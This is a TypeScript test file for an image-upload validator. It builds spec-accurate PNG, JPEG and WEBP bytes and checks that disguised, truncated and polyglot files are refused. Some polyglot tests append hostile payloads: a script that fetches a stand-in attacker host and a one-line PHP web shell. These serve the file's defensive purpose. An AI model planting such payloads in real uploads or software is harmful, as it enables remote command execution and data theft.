/**
 * What the byte inspector actually accepts, driven by REAL BYTES.
 *
 * Every fixture here is assembled from the format specifications rather than
 * mocked: a PNG really carries its signature, an IHDR with dimensions and a
 * closing IEND; a JPEG really carries SOI, a SOF0 frame header and EOI; a WEBP
 * really carries a RIFF header whose declared length is checked against the
 * buffer. That is what makes this a test of the validator instead of a test of
 * a stub.
 *
 * THE PROPERTY WORTH READING FOR: a container must account for the WHOLE FILE.
 * The polyglot cases below are the reason — a valid image with a ZIP, a script
 * or a second image appended to it is refused, and that is not something a
 * signature check alone can do.
 *
 * Fictional bytes only. Nothing here touches the network, a database or storage.
 *
 * Run:
 *   npx tsx --test src/lib/customerReviews/imageBytes.test.ts
 */

import { test, describe } from 'node:test'
import assert from 'node:assert/strict'
import {
  IMAGE_REJECTION_MESSAGES,
  SUPPORTED_IMAGE_MIMES,
  inspectImageBytes,
  type ImageRejection,
} from './imageBytes'

const MAX = 5 * 1024 * 1024

const bytes = (...parts: (number[] | Uint8Array)[]): Uint8Array => {
  const flat: number[] = []
  for (const part of parts) for (const b of part) flat.push(b)
  return new Uint8Array(flat)
}

const u16 = (n: number) => [(n >> 8) & 0xff, n & 0xff]
const u32be = (n: number) => [(n >>> 24) & 0xff, (n >>> 16) & 0xff, (n >>> 8) & 0xff, n & 0xff]
const u32le = (n: number) => [n & 0xff, (n >>> 8) & 0xff, (n >>> 16) & 0xff, (n >>> 24) & 0xff]
const chars = (s: string) => [...s].map(c => c.charCodeAt(0))

// ── Fixtures, built to spec ───────────────────────────────────────────────────

const PNG_SIG = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]

/** signature · IHDR(width, height, depth 8, colour 6) · IDAT · IEND */
function png(width = 4, height = 3, opts: { trailing?: number[]; noIend?: boolean } = {}): Uint8Array {
  const ihdr = bytes(
    u32be(13), chars('IHDR'),
    u32be(width), u32be(height),
    [8, 6, 0, 0, 0],
    u32be(0), // CRC, not verified by the inspector
  )
  const idat = bytes(u32be(4), chars('IDAT'), [0x78, 0x9c, 0x00, 0x00], u32be(0))
  const iend = opts.noIend ? [] : bytes(u32be(0), chars('IEND'), u32be(0))
  return bytes(PNG_SIG, ihdr, idat, iend, opts.trailing ?? [])
}

/** SOI · APP0 · SOF0(height, width) · EOI */
function jpeg(width = 6, height = 4, opts: { trailing?: number[]; noEoi?: boolean } = {}): Uint8Array {
  const app0 = bytes([0xff, 0xe0], u16(16), chars('JFIF'), [0], [1, 1, 0, 0, 1, 0, 1, 0, 0])
  const sof0 = bytes([0xff, 0xc0], u16(11), [8], u16(height), u16(width), [1, 1, 0x11, 0])
  const eoi = opts.noEoi ? [] : [0xff, 0xd9]
  return bytes([0xff, 0xd8], app0, sof0, eoi, opts.trailing ?? [])
}

/** RIFF · WEBP · VP8 chunk with a 14-bit dimension pair */
function webp(width = 8, height = 5, opts: { trailing?: number[]; declared?: number } = {}): Uint8Array {
  const payload = bytes(
    chars('WEBP'),
    chars('VP8 '), u32le(10),
    [0x00, 0x00, 0x00],          // frame tag
    [0x9d, 0x01, 0x2a],          // start code
    u32le(0).slice(0, 0),        // (nothing)
    [width & 0xff, (width >> 8) & 0x3f],
    [height & 0xff, (height >> 8) & 0x3f],
  )
  const trailing = opts.trailing ?? []
  const declared = opts.declared ?? payload.length + trailing.length
  return bytes(chars('RIFF'), u32le(declared), payload, trailing)
}

const rejection = (result: ReturnType<typeof inspectImageBytes>): ImageRejection | null =>
  result.ok ? null : result.reason

// ── Accepting real images ─────────────────────────────────────────────────────

describe('a genuine image is accepted, and its facts are read from the bytes', () => {
  test('PNG', () => {
    const result = inspectImageBytes(png(120, 90), MAX)
    assert.deepEqual(result, { ok: true, mime: 'image/png', width: 120, height: 90 })
  })

  test('JPEG', () => {
    const result = inspectImageBytes(jpeg(640, 480), MAX)
    assert.deepEqual(result, { ok: true, mime: 'image/jpeg', width: 640, height: 480 })
  })

  test('WEBP', () => {
    const result = inspectImageBytes(webp(320, 200), MAX)
    assert.deepEqual(result, { ok: true, mime: 'image/webp', width: 320, height: 200 })
  })

  test('the reported type is the CONTAINER, not anything a caller said', () => {
    // The function takes bytes and a limit. There is no filename parameter and
    // no declared-type parameter, so a claim cannot influence the answer.
    assert.equal(inspectImageBytes.length, 2)
    for (const result of [inspectImageBytes(png(), MAX), inspectImageBytes(jpeg(), MAX), inspectImageBytes(webp(), MAX)]) {
      assert.ok(result.ok && (SUPPORTED_IMAGE_MIMES as readonly string[]).includes(result.mime))
    }
  })
})

// ── Refusing everything else ──────────────────────────────────────────────────

describe('a file that is not one of the three formats', () => {
  test('an empty file', () => {
    assert.equal(rejection(inspectImageBytes(new Uint8Array(0), MAX)), 'empty')
  })

  test('a PDF, a ZIP, an executable, an SVG and an HTML page all read the same', () => {
    const cases: [string, number[]][] = [
      ['PDF',  chars('%PDF-1.7\n%\xe2\xe3\xcf\xd3\n')],
      ['ZIP',  [0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00]],
      ['ELF',  [0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]],
      ['EXE',  chars('MZ\x90\x00\x03\x00\x00\x00')],
      ['SVG',  chars('<svg xmlns="http://www.w3.org/2000/svg"></svg>')],
      ['HTML', chars('<!DOCTYPE html><html><body>hi</body></html>')],
      ['GIF',  chars('GIF89a')],
      ['TIFF', [0x49, 0x49, 0x2a, 0x00, 0x08, 0x00, 0x00, 0x00]],
    ]
    for (const [label, content] of cases) {
      assert.equal(rejection(inspectImageBytes(new Uint8Array(content), MAX)), 'unknown_format', label)
    }
  })

  test('the refusal never says WHICH kind of file it was', () => {
    // A caller has no business learning that the server recognised their
    // payload as an ELF binary. Every unsupported thing gets one answer.
    assert.equal(IMAGE_REJECTION_MESSAGES.unknown_format, 'Only JPG, PNG or WEBP images can be attached.')
  })
})

describe('SIZE IS THE REAL LENGTH, not a declared one', () => {
  test('a file at the limit passes and one byte over does not', () => {
    const image = png()
    assert.ok(inspectImageBytes(image, image.length).ok)
    assert.equal(rejection(inspectImageBytes(image, image.length - 1)), 'too_large')
  })

  test('the check runs before any parsing, so a huge non-image is cheap to refuse', () => {
    const big = new Uint8Array(64)
    assert.equal(rejection(inspectImageBytes(big, 10)), 'too_large')
  })
})

describe('A DISGUISED FILE IS REFUSED — the signature decides, not the name', () => {
  test('a PDF renamed .jpg is still a PDF', () => {
    // The caller cannot supply a name here at all, which is the point: by the
    // time bytes reach this function the filename has stopped mattering.
    const pdf = new Uint8Array(chars('%PDF-1.7\nstream'))
    assert.equal(rejection(inspectImageBytes(pdf, MAX)), 'unknown_format')
  })

  test('a JPEG signature glued onto non-JPEG data is refused', () => {
    const fake = bytes([0xff, 0xd8, 0xff], chars('this is not a jpeg at all'))
    assert.equal(inspectImageBytes(fake, MAX).ok, false)
  })

  test('a PNG signature with a wrong first chunk is refused', () => {
    const fake = bytes(PNG_SIG, u32be(13), chars('NOTI'), new Uint8Array(30))
    assert.equal(rejection(inspectImageBytes(fake, MAX)), 'malformed')
  })

  test('a RIFF container that is not WEBP is refused', () => {
    const wav = bytes(chars('RIFF'), u32le(30), chars('WAVE'), new Uint8Array(22))
    assert.equal(rejection(inspectImageBytes(wav, MAX)), 'malformed')
  })
})

describe('A POLYGLOT IS REFUSED — the container must account for the whole file', () => {
  test('a JPEG with a ZIP appended after EOI', () => {
    const zip = [0x50, 0x4b, 0x03, 0x04, 0x14, 0x00]
    assert.equal(rejection(inspectImageBytes(jpeg(10, 10, { trailing: zip }), MAX)), 'trailing_data')
  })

  test('a JPEG with a script appended after EOI', () => {
    const script = chars('<script>fetch("https://evil.test")</script>')
    assert.equal(rejection(inspectImageBytes(jpeg(10, 10, { trailing: script }), MAX)), 'trailing_data')
  })

  test('a PNG with data appended after IEND', () => {
    const junk = chars('<?php system($_GET[0]); ?>')
    assert.equal(rejection(inspectImageBytes(png(10, 10, { trailing: junk }), MAX)), 'trailing_data')
  })

  test('a WEBP whose RIFF length does not cover the file', () => {
    const image = webp(10, 10)
    const withExtra = bytes(image, chars('APPENDED'))
    assert.equal(rejection(inspectImageBytes(withExtra, MAX)), 'trailing_data')
  })

  test('two valid images concatenated are not one valid image', () => {
    assert.equal(inspectImageBytes(bytes(png(4, 4), jpeg(4, 4)), MAX).ok, false)
    assert.equal(inspectImageBytes(bytes(jpeg(4, 4), png(4, 4)), MAX).ok, false)
  })
})

describe('A TRUNCATED FILE IS REFUSED', () => {
  test('a PNG that never reached its IEND', () => {
    assert.equal(rejection(inspectImageBytes(png(10, 10, { noIend: true }), MAX)), 'truncated')
  })

  test('a JPEG that never reached its EOI', () => {
    assert.equal(inspectImageBytes(jpeg(10, 10, { noEoi: true }), MAX).ok, false)
  })

  test('a PNG cut off mid-header', () => {
    assert.equal(rejection(inspectImageBytes(png().slice(0, 20), MAX)), 'truncated')
  })

  test('a WEBP that claims more bytes than it has', () => {
    const short = webp(10, 10, { declared: 9999 })
    assert.equal(rejection(inspectImageBytes(short, MAX)), 'truncated')
  })

  test('a bare signature with nothing after it', () => {
    assert.equal(rejection(inspectImageBytes(new Uint8Array(PNG_SIG), MAX)), 'truncated')
    assert.equal(inspectImageBytes(new Uint8Array([0xff, 0xd8, 0xff]), MAX).ok, false)
    assert.equal(rejection(inspectImageBytes(new Uint8Array(chars('RIFF')), MAX)), 'truncated')
  })
})

describe('A MALFORMED IMAGE IS REFUSED', () => {
  test('a PNG declaring zero dimensions', () => {
    assert.equal(rejection(inspectImageBytes(png(0, 0), MAX)), 'bad_dimensions')
  })

  test('a PNG with an impossible bit depth or colour type', () => {
    const badDepth = png()
    badDepth[24] = 7
    assert.equal(rejection(inspectImageBytes(badDepth, MAX)), 'malformed')

    const badColour = png()
    badColour[25] = 9
    assert.equal(rejection(inspectImageBytes(badColour, MAX)), 'malformed')
  })

  test('a JPEG with no frame header has no dimensions to trust', () => {
    const noFrame = bytes([0xff, 0xd8], [0xff, 0xe0], u16(4), [0, 0], [0xff, 0xd9])
    assert.equal(inspectImageBytes(noFrame, MAX).ok, false)
  })

  test('a JPEG segment claiming an impossible length', () => {
    const bad = bytes([0xff, 0xd8], [0xff, 0xe0], u16(1), [0xff, 0xd9])
    assert.equal(rejection(inspectImageBytes(bad, MAX)), 'malformed')
  })
})

describe('every rejection has a prewritten sentence, and only prewritten sentences', () => {
  test('one message per code, and none of them quotes anything', () => {
    const codes: ImageRejection[] = [
      'empty', 'too_large', 'unknown_format',
      'truncated', 'malformed', 'trailing_data', 'bad_dimensions',
    ]
    for (const code of codes) {
      const message = IMAGE_REJECTION_MESSAGES[code]
      assert.ok(typeof message === 'string' && message.length > 0, code)
      // A message that interpolated anything would be a message that could
      // carry a filename or a byte of content into a response.
      assert.equal(/\$\{|%s|\+ /.test(message), false, code)
    }
    assert.equal(Object.keys(IMAGE_REJECTION_MESSAGES).length, codes.length)
  })
})
